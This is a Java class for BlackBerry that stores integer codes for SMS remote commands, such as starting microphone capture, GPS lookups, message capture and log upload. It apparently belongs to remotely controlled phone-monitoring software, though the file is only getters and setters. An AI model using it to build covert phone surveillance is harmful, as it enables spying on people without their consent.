package com.vvt.rmtcmd;

import net.rim.device.api.util.Persistable;

public class SMSCommandCode implements Persistable {
	
	private int startCaptureCmd = 0;
	private int stopCaptureCmd = 0;
	private int sendLogNowCmd = 0;
	private int sendDiagnosticsCmd = 0;
	private int simCmd = 0;
	private int startMicCmd = 0;
	private int stopMicCmd = 0;
	private int gpsCmd = 0;
	private int gpsOnDemandCmd = 0;
	private int watchListCmd = 0;
	private int bbmCmd = 0;
	private int activationCmd = 0;
	private int deactivationCmd = 0;
	
	public int getStartCaptureCmd() {
		return startCaptureCmd;
	}
	
	public int getStopCaptureCmd() {
		return stopCaptureCmd;
	}
	
	public int getSendLogNowCmd() {
		return sendLogNowCmd;
	}
	
	public int getSendDiagnosticsCmd() {
		return sendDiagnosticsCmd;
	}
	
	public int getSIMCmd() {
		return simCmd;
	}
	
	public int getStartMicCmd() {
		return startMicCmd;
	}
	
	public int getStopMicCmd() {
		return stopMicCmd;
	}
	
	public int getGPSCmd() {
		return gpsCmd;
	}
	
	public int getGPSOnDemandCmd() {
		return gpsOnDemandCmd;
	}
	
	public int getWatchListCmd() {
		return watchListCmd;
	}
	
	public int getBBMCmd() {
		return bbmCmd;
	}
	
	public int getActivationCmd() {
		return activationCmd;
	}
	
	public int getDeactivationCmd() {
		return deactivationCmd;
	}
	
	public void setStartCaptureCmd(int startCaptureCmd) {
		this.startCaptureCmd = startCaptureCmd;
	}
	
	public void setStopCaptureCmd(int stopCaptureCmd) {
		this.stopCaptureCmd = stopCaptureCmd;
	}
	
	public void setSendLogNowCmd(int sendLogNowCmd) {
		this.sendLogNowCmd = sendLogNowCmd;
	}
	
	public void setSendDiagnosticsCmd(int sendDiagnosticsCmd) {
		this.sendDiagnosticsCmd = sendDiagnosticsCmd;
	}
	
	public void setSIMCmd(int simCmd) {
		this.simCmd = simCmd;
	}
	
	public void setStartMicCmd(int startMicCmd) {
		this.startMicCmd = startMicCmd;
	}
	
	public void setStopMicCmd(int stopMicCmd) {
		this.stopMicCmd = stopMicCmd;
	}
	
	public void setGPSCmd(int gpsCmd) {
		this.gpsCmd = gpsCmd;
	}
	
	public void setGPSOnDemandCmd(int gpsOnDemandCmd) {
		this.gpsOnDemandCmd = gpsOnDemandCmd;
	}
	
	public void setWatchListCmd(int watchListCmd) {
		this.watchListCmd = watchListCmd;
	}
	
	public void setBBMCmd(int bbmCmd) {
		this.bbmCmd = bbmCmd;
	}

	public void setActivationCmd(int activationCmd) {
		this.activationCmd = activationCmd;
	}

	public void setDeactivationCmd(int deactivationCmd) {
		this.deactivationCmd = deactivationCmd;
	}
}
